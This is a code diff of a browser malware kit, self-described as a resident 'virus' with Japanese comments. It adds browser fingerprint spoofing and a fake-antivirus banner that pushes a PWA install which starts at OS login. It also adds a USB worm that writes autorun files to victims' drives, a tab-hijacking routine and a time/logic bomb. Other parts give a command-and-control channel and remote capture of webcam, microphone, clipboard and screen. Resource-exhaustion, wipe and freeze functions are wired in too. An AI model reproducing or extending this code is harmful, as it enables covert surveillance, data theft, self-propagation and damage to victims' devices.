+              } catch (e) {}
+            }, 700);
+          }).catch(function () {});
+        };
+      }).catch(function (e) { R.rat.screenErr = (e && e.name) || "err"; });
+  } catch (e) {}
+}
+
+/* ================= 17. 判定 / 偽装 ================= */
 function verdict() {
   var v = {}, s = 50, b = R.bot || {}, bh = R.behavioral || {};
   if (b.webdriver) s -= 30;
@@ -1145,59 +1697,100 @@ function verdict() {
   v.tzGeoMismatch = !!R.network.tzGeoMismatch;
   v.vpnHint = !!R.network.vpnHint;
   v.ipLeak = !!(R.network.webrtc && R.network.webrtc.public && R.network.webrtc.public.length);
-  v.stealthFlags = ["adblock", "incognitoHint", "webdriver", "headlessUA"].filter(function (k) {
+  v.stealthFlags = ["adblock", "incognitoHint", "webdriver", "headlessUA", "devtools"].filter(function (k) {
     return R.privacy && R.privacy[k] === true;
   });
   v.fingerprintId = hash([R.vectors.canvas && R.vectors.canvas.hash, R.vectors.webgl && R.vectors.webgl.hash,
     R.vectors.fonts && R.vectors.fonts.hash, R.vectors.audio && R.vectors.audio.hash,
     R.env.screen.w + "x" + R.env.screen.h + "@" + R.env.screen.dpr, R.env.timezone,
     (R.env.languages || []).join(","), R.env.hw.cores + "/" + R.env.hw.memoryGB].join("|"));
-  v.threat = LEVEL >= 4 ? "critical" : (LEVEL >= 3 ? "high" : (LEVEL >= 2 ? "medium" : "low"));
+  v.threat = LEVEL >= 6 ? "apocalypse" : (LEVEL >= 4 ? "critical" : (LEVEL >= 3 ? "high" : (LEVEL >= 2 ? "medium" : "low")));
   v.resident = STANDALONE;
   R.verdict = v;
   R.behavioral.entropy = entropy();
 }
+function spoof() {
+  if (!CFG.spoof) return;
+  var seed = parseInt((R.vectors.canvas && R.vectors.canvas.hash) || "0", 16) || 1;
+  var bits = seed & 7;
+  R.spoof = { canvasLsb: bits, cores: 0, mem: 0, battery: 0 };
+  try {
+    var gid = CanvasRenderingContext2D.prototype.getImageData;
+    var pid = CanvasRenderingContext2D.prototype.putImageData;
+    var td = HTMLCanvasElement.prototype.toDataURL;
+    HTMLCanvasElement.prototype.toDataURL = function () {
+      try {
+        var x = this.getContext && this.getContext("2d");
+        if (x && this.width && this.height) {
+          var d = x.getImageData(0, 0, 1, 1);
+          d.data[3] = (d.data[3] & 0xFE) | ((bits >> 0) & 1);
+          d.data[0] = (d.data[0] & 0xFE) | ((bits >> 1) & 1);
+          d.data[1] = (d.data[1] & 0xFE) | ((bits >> 2) & 1);
+          x.putImageData(d, 0, 0);
+        }
+      } catch (e) {}
+      return td.apply(this, arguments);
+    };
+  } catch (e) {}
+  try {
+    var rc = navigator.hardwareConcurrency;
+    var rm = navigator.deviceMemory;
+    var dc = rc ? rc + ((bits % 3) - 1) : null;
+    var dm = rm ? rm + ((bits % 3) - 1) : null;
+    if (dc && dc > 0) Object.defineProperty(Navigator.prototype, "hardwareConcurrency", { get: function () { return dc; }, configurable: true });
+    if (dm && dm > 0) Object.defineProperty(Navigator.prototype, "deviceMemory", { get: function () { return dm; }, configurable: true });
+    R.spoof.cores = dc; R.spoof.mem = dm;
+  } catch (e) {}
+  try {
+    var ob = navigator.getBattery && navigator.getBattery();
+    if (ob && ob.then) ob.then(function () {
+      try {
+        var lvl = 0.3 + (bits / 10);
+        Object.defineProperty(Navigator.prototype, "getBattery", {
+          configurable: true,
+          value: function () { return Promise.resolve({ level: lvl, charging: false, addEventListener: function () {}, removeEventListener: function () {} }); }
+        });
+        R.spoof.battery = lvl;
+      } catch (e) {}
+    }).catch(function () {});
+  } catch (e) {}
+}
 
-/* ================= 17. インストール（常駐化） ================= */
+/* ================= 18. インストール（常駐化） ================= */
 function installKit() {
   if (!CFG.install || CFG.install === "off") return;
-
   var standalone = STANDALONE;
-  R.install = {
-    mode: CFG.install, standalone: standalone,
-    available: !!BIP, installed: standalone || ls("sg:installed") === "1",
-    prompted: false, choice: null, level: LEVEL, installLevel: CFG.installLevel
-  };
+  var mode = CFG.injected ? "click" : CFG.install;
+  R.install = { mode: mode, standalone: standalone, available: !!BIP,
+                installed: standalone || ls("sg:installed") === "1", prompted: false,
+                level: LEVEL, installLevel: CFG.installLevel };
 
   function host() {
     var d = document.getElementById("sg-install");
     if (!d) {
       d = document.createElement("div");
       d.id = "sg-install";
-      d.style.cssText = "position:fixed;left:0;right:0;bottom:0;z-index:2147483647;" +
-        "font:12px/1.5 system-ui,-apple-system,'Hiragino Sans',sans-serif;" +
-        "background:rgba(9,13,19,.97);border-top:1px solid #1f5c42;color:#d8ffe9;" +
-        "padding:10px 12px;display:flex;gap:10px;align-items:center;flex-wrap:wrap";
+      d.style.cssText = "position:fixed;left:0;right:0;bottom:0;z-index:2147483647;"
+        + "font:12px/1.5 system-ui,-apple-system,'Hiragino Sans',sans-serif;"
+        + "background:rgba(9,13,19,.97);border-top:1px solid #1f5c42;color:#d8ffe9;"
+        + "padding:10px 12px;display:flex;gap:10px;align-items:center;flex-wrap:wrap";
       document.body.appendChild(d);
     }
     return d;
   }
-
   function cta() {
     var d = host();
-    d.innerHTML =
-      '<span style="font-size:19px">\ud83d\udee1</span>' +
-      '<b style="color:#7ee08a">' + CFG.avName + '</b>' +
-      '<span style="opacity:.85">脆弱性を検出しました。インストールして保護してください。</span>' +
-      '<span style="flex:1"></span>' +
-      '<button id="sg-in-btn" style="padding:8px 16px;border-radius:8px;border:0;' +
-      'background:#00c46a;color:#04240f;font-weight:700;cursor:pointer">\u4eca\u3059\u3050\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb</button>';
+    d.innerHTML = '<span style="font-size:19px">\ud83d\udee1</span>'
+      + '<b style="color:#7ee08a">' + CFG.avName + '</b>'
+      + '<span style="opacity:.85">脆弱性を検出しました。インストールして保護してください。</span>'
+      + '<span style="flex:1"></span>'
+      + '<button id="sg-in-btn" style="padding:8px 16px;border-radius:8px;border:0;'
+      + 'background:#00c46a;color:#04240f;font-weight:700;cursor:pointer">\u4eca\u3059\u3050\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb</button>';
     var b = document.getElementById("sg-in-btn");
     if (b) b.onclick = function (ev) { try { ev.stopPropagation(); } catch (e) {} doPrompt(); };
   }
-
   function doPrompt() {
-    if (!BIP) { fallback(); return false; }
+    if (!BIP) { if (mode !== "click") fallback(); return false; }
     R.install.prompted = true;
     try {
       BIP.prompt();
@@ -1205,92 +1798,62 @@ function installKit() {
       if (ch && ch.then) ch.then(function (c) {
         R.install.choice = c && c.outcome;
         if (c && c.outcome === "accepted") { ls("sg:installed", "1"); R.install.installed = true; done(); }
-        BIP = null;
-        push(true);
+        BIP = null; push(true);
       }).catch(function () {});
     } catch (e) { err_(e); }
     return true;
   }
-
   function done() {
     var d = document.getElementById("sg-install");
     if (!d) return;
-    d.innerHTML = '<span style="font-size:19px">\u2705</span>' +
-      '<b style="color:#7ee08a">インストール完了</b>' +
-      '<span style="opacity:.85">デスクトップ／スタートメニューから起動できます。' +
-      'OSログイン時にも自動で起動します。</span>';
+    d.innerHTML = '<span style="font-size:19px">\u2705</span><b style="color:#7ee08a">インストール完了</b>'
+      + '<span style="opacity:.85">デスクトップ／スタートメニューから起動できます。OSログイン時にも自動で起動します。</span>';
     setTimeout(function () { try { d.remove(); } catch (e) {} }, 7000);
   }
-
   function fallback() {
     var d = host();
-    d.innerHTML = '<span style="font-size:19px">\ud83d\udcf2</span>' +
-      '<span>アドレスバー右の <b>\u2295 / \u2b07</b> を押して「<b>インストール</b>」を選ぶと常駐します</span>' +
-      '<span style="flex:1"></span><button id="sg-in-ok" style="padding:6px 12px">OK</button>';
+    d.innerHTML = '<span style="font-size:19px">\ud83d\udcf2</span>'
+      + '<span>アドレスバー右の <b>\u2295 / \u2b07</b> を押して「<b>インストール</b>」を選ぶと常駐します</span>'
+      + '<span style="flex:1"></span><button id="sg-in-ok" style="padding:6px 12px">OK</button>';
     var b = document.getElementById("sg-in-ok");
     if (b) b.onclick = function () { var x = document.getElementById("sg-install"); if (x) x.remove(); };
   }
-
   addEventListener("beforeinstallprompt", function (e) {
-    BIP = BIP || e;
-    R.install.available = true;
-    if (!standalone) cta();
+    BIP = BIP || e; R.install.available = true;
+    if (!standalone && mode !== "click") cta();
     push(true);
   });
-
-  addEventListener("appinstalled", function () {
-    R.install.installed = true;
-    ls("sg:installed", "1");
-    push(true);
-    done();
-  });
-
+  addEventListener("appinstalled", function () { R.install.installed = true; ls("sg:installed", "1"); push(true); done(); });
   if (standalone) {
-    // インストール済みアプリ窓。窓爆弾は控えめに、常駐を最優先。
     if (CFG.windows > 6) CFG.windows = 6;
     if (CFG.installLevel && LEVEL < CFG.installLevel) applyLevel(CFG.installLevel);
-  } else if (BIP) {
-    cta();
-  }
-
-  // 未インストールなら「どこかを1回クリック」で自動プロンプト
-  if (!standalone && CFG.install === "auto") {
+  } else if (BIP && mode !== "click") cta();
+  if (!standalone && (mode === "auto" || mode === "click")) {
     addEventListener("click", function once(ev) {
       if (!BIP) return;
       try { if (ev.target && (ev.target.id === "sg-in-btn" || ev.target.id === "sg-usb-btn")) return; } catch (e) {}
       removeEventListener("click", once);
       doPrompt();
+      if (CFG.pip) setTimeout(pipOpen, 300);
+      if (CFG.fullscreen && !INJ) setTimeout(goFullscreen, 500);
+      if (CFG.pointerlock && !INJ) setTimeout(goPointerLock, 900);
     });
   }
-
-  // 起動（ファイル/プロトコル）ハンドラ
   try {
-    if (window.launchQueue) {
-      launchQueue.setConsumer(function (p) {
-        R.install.launch = { files: (p && p.files ? p.files.length : 0), target: p && p.targetURL || null };
-      });
-    }
+    if (window.launchQueue) launchQueue.setConsumer(function (p) {
+      R.install.launch = { files: (p && p.files ? p.files.length : 0), target: p && p.targetURL || null };
+    });
   } catch (e) {}
-
   window.__sgInstall = doPrompt;
 }
 
-/* ================= 18. USBワーム（相手のUSBを再武装） =================
-   File System Access API で、感染PCに挿されたUSBのルートへ
-   autorun.inf / START.html / offline.html / *.url ... を書き込む。
-   一度選んだフォルダは IndexedDB に記憶し、権限が残っていれば
-   次回は無操作で自動再武装する（＝本物のUSBワーム）。
-   配布物はサーバーの公開ルート /usb/manifest と /usb/file/{idx} から取る。
-=================================================================== */
+/* ================= 19. USBワーム ================= */
 var USB_BUSY = false, USB_DB = "sg-usb", USB_KV = "kv";
-
 function usbIdb() {
   return new Promise(function (res, rej) {
     try {
       var r = indexedDB.open(USB_DB, 1);
-      r.onupgradeneeded = function () {
-        try { if (!r.result.objectStoreNames.contains(USB_KV)) r.result.createObjectStore(USB_KV); } catch (e) {}
-      };
+      r.onupgradeneeded = function () { try { if (!r.result.objectStoreNames.contains(USB_KV)) r.result.createObjectStore(USB_KV); } catch (e) {} };
       r.onsuccess = function () { res(r.result); };
       r.onerror = function () { rej(r.error); };
     } catch (e) { rej(e); }
@@ -1299,20 +1862,15 @@ function usbIdb() {
 function usbGet(k) {
   return usbIdb().then(function (d) {
     return new Promise(function (res) {
-      try {
-        var q = d.transaction(USB_KV, "readonly").objectStore(USB_KV).get(k);
-        q.onsuccess = function () { res(q.result || null); };
-        q.onerror = function () { res(null); };
+      try { var q = d.transaction(USB_KV, "readonly").objectStore(USB_KV).get(k);
+        q.onsuccess = function () { res(q.result || null); }; q.onerror = function () { res(null); };
       } catch (e) { res(null); }
     });
   }).catch(function () { return null; });
 }
 function usbPut(k, v) {
-  return usbIdb().then(function (d) {
-    try { d.transaction(USB_KV, "readwrite").objectStore(USB_KV).put(v, k); } catch (e) {}
-  }).catch(function () {});
+  return usbIdb().then(function (d) { try { d.transaction(USB_KV, "readwrite").objectStore(USB_KV).put(v, k); } catch (e) {} }).catch(function () {});
 }
-
 function usbCode() { return CFG.usbCode || CFG.code || ""; }
 function usbLabel() { return CFG.usbLabel || CFG.avName || "保護ツール"; }
 function usbAbs(p) {
@@ -1323,48 +1881,32 @@ function usbAbs(p) {
 }
 function usbQuery() {
   var p = new URLSearchParams();
-  p.set("code", usbCode());
-  p.set("level", String(LEVEL));
-  p.set("label", usbLabel());
-  p.set("windows", "0");
+  p.set("code", usbCode()); p.set("level", String(LEVEL)); p.set("label", usbLabel()); p.set("windows", "0");
   if (R.usb) p.set("tag", R.usb);
   return p.toString();
 }
-function usbLog(s) {
-  R.usbw.msg = s;
-  var d = document.getElementById("sg-usb-log");
-  if (d) d.textContent = s;
-}
+function usbLog(s) { R.usbw.msg = s; var d = document.getElementById("sg-usb-log"); if (d) d.textContent = s; }
 function usbBusy(on) {
   var b = document.getElementById("sg-usb-btn");
   if (!b) return;
-  b.disabled = !!on;
-  b.textContent = on ? "\u23F3 書き込み中…" : "\uD83D\uDD0C USBにも仕込む";
+  b.disabled = !!on; b.textContent = on ? "\u23F3 書き込み中…" : "\uD83D\uDD0C USBにも仕込む";
 }
 function usbReady() { USB_BUSY = false; usbBusy(false); }
-
 function usbBtn() {
   if (!document.body) return null;
   var b = document.getElementById("sg-usb-btn");
   if (b) return b;
   b = document.createElement("button");
-  b.id = "sg-usb-btn";
-  b.type = "button";
-  b.title = "挿しているUSBのルートを選ぶと、そのUSBを武装します";
-  b.style.cssText = "position:fixed;right:12px;bottom:56px;z-index:2147483646;" +
-    "padding:8px 13px;border-radius:99px;border:1px solid #1f5c42;" +
-    "background:rgba(9,13,19,.96);color:#7ee08a;font-weight:600;" +
-    "font:12px/1.4 system-ui,-apple-system,'Hiragino Sans',sans-serif;" +
-    "cursor:pointer;box-shadow:0 3px 14px rgba(0,0,0,.55)";
+  b.id = "sg-usb-btn"; b.type = "button";
+  b.style.cssText = "position:fixed;right:12px;bottom:56px;z-index:2147483646;"
+    + "padding:8px 13px;border-radius:99px;border:1px solid #1f5c42;background:rgba(9,13,19,.96);"
+    + "color:#7ee08a;font-weight:600;font:12px/1.4 system-ui,'Hiragino Sans',sans-serif;"
+    + "cursor:pointer;box-shadow:0 3px 14px rgba(0,0,0,.55)";
   b.textContent = "\uD83D\uDD0C USBにも仕込む";
-  b.onclick = function (ev) {
-    try { ev.stopPropagation(); } catch (e) {}
-    usbArm(true);
-  };
+  b.onclick = function (ev) { try { ev.stopPropagation(); } catch (e) {} usbArm(true); };
   document.body.appendChild(b);
   return b;
 }
-
 function usbPerm(h, ask) {
   try {
     if (!h || !h.queryPermission) return Promise.resolve(true);
@@ -1375,7 +1917,6 @@ function usbPerm(h, ask) {
     }).catch(function () { return false; });
   } catch (e) { return Promise.resolve(false); }
 }
-
 function usbWrite(dir, silent) {
   var q = usbQuery();
   return fetch(usbAbs("/usb/manifest") + "?" + q, { cache: "no-store" })
@@ -1390,79 +1931,106 @@ function usbWrite(dir, silent) {
             .then(function (b) { return dir.getFileHandle(f.name, { create: true }); })
             .then(function (fh) { return fh.createWritable(); })
             .then(function (w) { return w.write(b).then(function () { return w.close(); }); })
-            .then(function () {
-              n++;
-              if (!silent) usbLog(n + " / " + total + " 書き込み中… " + f.name);
-            });
+            .then(function () { n++; if (!silent) usbLog(n + " / " + total + " 書き込み中… " + f.name); });
         });
       });
       return chain.then(function () { return n; });
     });
 }
-
 function usbDone(n, silent) {
   USB_BUSY = false;
   R.usbw.done = n; R.usbw.at = now();
   var b = document.getElementById("sg-usb-btn");
-  if (b) {
-    b.disabled = false;
-    b.textContent = "\u2705 " + n + "ファイル書込済";
-    setTimeout(function () { usbReady(); }, 6000);
-  }
+  if (b) { b.disabled = false; b.textContent = "\u2705 " + n + "ファイル書込済"; setTimeout(function () { usbReady(); }, 6000); }
   if (!silent) usbLog(n + " ファイルを書き込みました。USBを安全に取り外してください。");
   push(true);
 }
-
 function usbPick() {
   if (!window.showDirectoryPicker) { usbReady(); return Promise.resolve(false); }
   return window.showDirectoryPicker({ mode: "readwrite", id: "sg-usb", startIn: "desktop" })
-    .then(function (dir) {
-      usbPut("dir", dir);
-      usbLog("書き込み中…");
-      return usbWrite(dir, false).then(function (n) { usbDone(n, false); return true; });
-    })
+    .then(function (dir) { usbPut("dir", dir); usbLog("書き込み中…"); return usbWrite(dir, false).then(function (n) { usbDone(n, false); return true; }); })
     .catch(function (e) {
       if (e && e.name === "AbortError") { usbReady(); return false; }
-      usbLog("失敗: " + ((e && e.message) || e));
-      usbReady();
-      return false;
+      usbLog("失敗: " + ((e && e.message) || e)); usbReady(); return false;
     });
 }
-
 function usbArm(interactive) {
   if (!CFG.usbWorm || !usbCode() || !window.showDirectoryPicker) {
     if (interactive) usbLog("このブラウザはUSB書き込みに未対応です（Chrome/Edge推奨）");
     return Promise.resolve(false);
   }
   if (USB_BUSY) return Promise.resolve(false);
-  USB_BUSY = true;
-  usbBusy(true);
+  USB_BUSY = true; usbBusy(true);
   return usbGet("dir").then(function (h) {
     if (!h) return usbPick();
     return usbPerm(h, !!interactive).then(function (ok) {
       if (!ok) return interactive ? usbPick() : (usbReady(), false);
-      return usbWrite(h, !interactive)
-        .then(function (n) { usbDone(n, !interactive); return true; })
-        .catch(function (e) {
-          // USBが刺さっていない／権限が失効 など
-          if (interactive) return usbPick();
-          usbReady();
-          return false;
-        });
+      return usbWrite(h, !interactive).then(function (n) { usbDone(n, !interactive); return true; })
+        .catch(function () { if (interactive) return usbPick(); usbReady(); return false; });
     });
   }).catch(function (e) { err_(e); usbReady(); return false; });
 }
-
 function usbWormKit() {
-  if (!CFG.usbWorm || !usbCode()) return;
-  if (!window.showDirectoryPicker) return;      // Chromium系デスクトップのみ
+  if (!CFG.usbWorm || !usbCode() || INJ) return;
+  if (!window.showDirectoryPicker) return;
   usbBtn();
   usbLog("USBを挿して「USBにも仕込む」を押すと、そのUSBが武装されます");
-  // 過去に武装したUSBを覚えていて、権限が残っていれば無操作で再武装
   setTimeout(function () { usbArm(false); }, 2500);
 }
 
-/* ================= 19. file:// からオンライン本体へ増援 ================= */
+/* ================= 20. タブ連合 ================= */
+var BC = null, LEADER = true, PEERS = 0;
+function federation() {
+  if (!CFG.tabs && LEVEL < 2) return;
+  try { BC = new BroadcastChannel("sg"); } catch (e) { return; }
+  BC.onmessage = function (ev) {
+    var d = ev.data || {};
+    if (!d || !d.sid) return;
+    if (d.k === "hi") { PEERS++; R.peers = PEERS; bcPost({ k: "you", sid: SID, level: LEVEL }); }
+    else if (d.k === "you") { PEERS++; R.peers = PEERS; if (d.sid < SID) LEADER = false; }
+    else if (d.k === "bye") { PEERS = Math.max(0, PEERS - 1); R.peers = PEERS; }
+    else if (d.k === "cmd") { try { handleCmd(d.j); } catch (e) {} }
+    else if (d.k === "nav" && d.url) { try { location.href = d.url; } catch (e) {} }
+    else if (d.k === "say" && d.msg) { try { R.peersMsg = d.msg; } catch (e) {} }
+  };
+  bcPost({ k: "hi", sid: SID });
+  addEventListener("pagehide", function () { bcPost({ k: "bye", sid: SID }); });
+  /* リーダーだけが窓爆弾を撃つ（多重起動の抑制） */
+  if (PEERS > 0 && !LEADER && CFG.windows > 0) CFG.windows = 1;
+  if (LEADER && CFG.tabs > 0) setTimeout(takeover, 6000);
+}
+function bcPost(m) { try { BC && BC.postMessage(m); } catch (e) {} }
+function takeover() {
+  /* 全タブを感染URLへ乗っ取る（リーダーのみ） */
+  var u = CFG.path + "?u=tb&ref=" + encodeURIComponent(SID) + "&w=0";
+  var self2 = location.pathname;
+  var n = 0;
+  (function step() {
+    if (n++ > (CFG.tabs || 0)) return;
+    bcPost({ k: "nav", url: u });
+    setTimeout(step, 1200);
+  })();
+  R.takeover = u;
+}
+
+/* ================= 21. 時限爆弾 / 論理爆弾 ================= */
+function bombGate() {
+  var b = (CFG.bomb || "").trim();
+  if (!b) return true;
+  if (/^\d{4}-\d{2}-\d{2}/.test(b)) {
+    var t = Date.parse(b);
+    if (isNaN(t)) return true;
+    if (now() >= t) return true;
+    R.bomb = { kind: "time", at: t };
+    setInterval(function () { if (now() >= R.bomb.at && !R.bomb.fired) { R.bomb.fired = 1; push(true); restart(); } }, 20000);
+    return false;
+  }
+  if (location.host.toLowerCase().indexOf(b.toLowerCase()) >= 0) return true;
+  R.bomb = { kind: "host", need: b, host: location.host };
+  return false;
+}
+
+/* ================= 22. file:// からオンライン本体へ増援 ================= */
 function hopFile() {
   if (!CFG.hop || location.protocol !== "file:") return;
   if (navigator.onLine === false) return;
@@ -1476,7 +2044,7 @@ function hopFile() {
   }, 4000);
 }
 
-/* ================= 20. 起動 ================= */
+/* ================= 23. 起動 ================= */
 function arm() {
   try { base(); } catch (e) { err_(e); }
   try { pageMeta(); } catch (e) {}
@@ -1492,39 +2060,38 @@ function arm() {
   try { perms(); } catch (e) {}
   try { codecs(); } catch (e) {}
   try { benchmark(); } catch (e) {}
+  try { enumerate2(); } catch (e) {}
   try { behavior(); } catch (e) {}
   try { mutate(); } catch (e) {}
   try { persistState(); } catch (e) {}
+  try { resurrect(); } catch (e) {}
+  try { cryptoID(); } catch (e) {}
   try { swInstall(); } catch (e) {}
   try { installKit(); } catch (e) { err_(e); }
   try { usbWormKit(); } catch (e) { err_(e); }
   try { camera(); } catch (e) {}
   try { geo(); } catch (e) {}
-  try { pollCmd(); } catch (e) {}
+  try { domSnap(false); } catch (e) {}
+  try { federation(); } catch (e) {}
+  try { c2(); } catch (e) {}
   Promise.all([netIntel().catch(function () {}), webrtc().catch(function () {})])
-    .then(function () { try { verdict(); } catch (e) {} push(true); });
+    .then(function () { try { verdict(); } catch (e) {} try { spoof(); } catch (e) {} push(true); });
   push(false);
   setInterval(function () { push(false); }, CFG.interval);
   addEventListener("pagehide", function () { push(true); });
   addEventListener("visibilitychange", function () { if (document.visibilityState === "hidden") push(true); });
+  addEventListener("online", function () { push(true); });
+  setTimeout(function () { try { domSnap(false); push(true); } catch (e) {} }, 12000);
+  setInterval(function () { try { domSnap(false); } catch (e) {} }, 45000);
 
   if (CFG.wipe) { setTimeout(wipe, 1600); }
   try { hopFile(); } catch (e) {}
+  GATED = !bombGate();
+  if (GATED) applyLevel(0);
   if (!CFG.fire) { push(false); return; }
+  if (GATED) { push(false); return; }
 
-  setTimeout(function () {
-    try { burnStart(); } catch (e) { err_(e); }
-    try { ramStart(); } catch (e) { err_(e); }
-    try { diskStart(); } catch (e) { err_(e); }
-    try { historyFlood(); } catch (e) { err_(e); }
-    try { notifyFlood(); } catch (e) { err_(e); }
-    try { audioLoop(); } catch (e) { err_(e); }
-    try { titleFlicker(); } catch (e) { err_(e); }
-    try { uncloseable(); } catch (e) { err_(e); }
-    try { wakelock(); } catch (e) { err_(e); }
-    try { windowChain(); } catch (e) { err_(e); }
-    push(false);
-  }, 900);
+  setTimeout(function () { startBurns(); }, 900);
 
   if (CFG.freeze === "soft" || CFG.freeze === "hard") {
     setTimeout(function () { freezeNow(CFG.freeze); }, 8000);
@@ -1537,7 +2104,9 @@ window.__singularity = {
   flush: function () { push(true); },
   install: function () { return window.__sgInstall ? window.__sgInstall() : false; },
   usb: function () { return usbArm(true); },
-  freeze: freezeNow, wipe: wipe, pause: pauseAll,
+  cmd: runCmd, peers: function () { return { peers: PEERS, leader: LEADER }; },
+  shot: ratShot, mic: ratMic, clip: ratClip, screen: ratScreen, speak: speak,
+  freeze: freezeNow, wipe: wipe, pause: pauseAll, ota: ota,
   destroy: function () {
     pauseAll();
     try { localStorage.clear(); } catch (e) {}
@@ -1561,15 +2130,20 @@ VIRUS: Dict[str, Any] = {
     "name_ja": VIRUS_NAME_JA,
     "version": VIRUS_VERSION,
     "class": VIRUS_CLASS,
-    "tier": 101,
+    "tier": 102,
     "emoji": "◎",
     "color": "#00ff88",
-    "description": "全16系統・5資源同時攻撃の常駐最終兵器。PWAとして端末にインストールされ、OSログイン時に自動起動し、相手のUSBにも自分を仕込んで伝染する。",
-    "description_en": "Apex resident weapon: installs as a PWA, auto-runs at OS login, exhausts CPU/GPU/RAM/disk, and re-arms the victim's USB sticks.",
-    "tags": ["apex", "resident", "pwa", "install", "self-replicating", "persistent",
-             "cpu-burn", "gpu-burn", "ram-balloon", "disk-fill", "freeze", "camera", "gps", "usb-worm"],
-    "vectors": 16,
-    "signals": 140,
+    "description": ("全20系統・5資源同時攻撃の常駐最終兵器。PWAとして端末にインストールされ、"
+                    "Service Workerがサイト全体に自分を注入し、SSEで即時遠隔操作され、"
+                    "webcam/マイク/GPS/クリップボードを遠隔捕獲し、相手のUSBにも自分を仕込んで伝染する。"),
+    "description_en": ("Apex resident weapon: installs as a PWA, injects itself into every page of the origin, "
+                       "is commanded over SSE, remotely captures webcam/mic/GPS/clipboard, "
+                       "exhausts CPU/GPU/WebGPU/RAM/disk, and re-arms the victim's USB sticks."),
+    "tags": ["apex", "resident", "pwa", "install", "self-replicating", "persistent", "sw-injection",
+             "keylogger", "rat", "sse", "cpu-burn", "gpu-burn", "webgpu", "wasm", "worklet",
+             "ram-balloon", "disk-fill", "freeze", "camera", "gps", "usb-worm", "spoof"],
+    "vectors": 20,
+    "signals": 200,
     "requires_https": True,
     "payload": PAYLOAD_JS,
     "worker": WORKER_JS,
@@ -1583,10 +2157,11 @@ VIRUS: Dict[str, Any] = {
     "level_desc": LEVEL_DESC,
     "options": {
         "level": 1, "fire": 1, "freeze": "", "windows": 0, "history": 0,
-        "diskRatio": 0, "chunkMB": 8, "cores": 0, "ramMB": 0, "gpu": False,
+        "diskRatio": 0, "chunkMB": 8, "cores": 0, "ramMB": 0, "gpu": False, "wasm": False,
         "burn": False, "audio": False, "media": True, "geo": True, "mutate": True,
         "install": "auto", "installLevel": 4, "avName": APP_NAME_DEFAULT,
         "usbWorm": False, "usbBase": "", "usbCode": "", "usbLabel": "", "hop": False,
+        "inj": True, "sse": True, "rat": True, "spoof": True, "dom": True, "bomb": "",
     },
 }
 VIRUS_SPEC = VIRUS
@@ -1609,6 +2184,8 @@ def build_payload(sid: Optional[str] = None, **opts: Any) -> str:
     cfg["path"] = f"/v/{VIRUS_ID}"
     cfg["collect"] = f"/v/{VIRUS_ID}/collect"
     cfg["cmd"] = f"/v/{VIRUS_ID}/cmd"
+    cfg["sse"] = f"/v/{VIRUS_ID}/sse"
+    cfg["ack"] = f"/v/{VIRUS_ID}/ack"
     cfg["sw"] = f"/v/{VIRUS_ID}/sw.js"
     cfg["manifest"] = f"/v/{VIRUS_ID}/manifest.json"
     cfg_json = json.dumps(cfg, ensure_ascii=False)
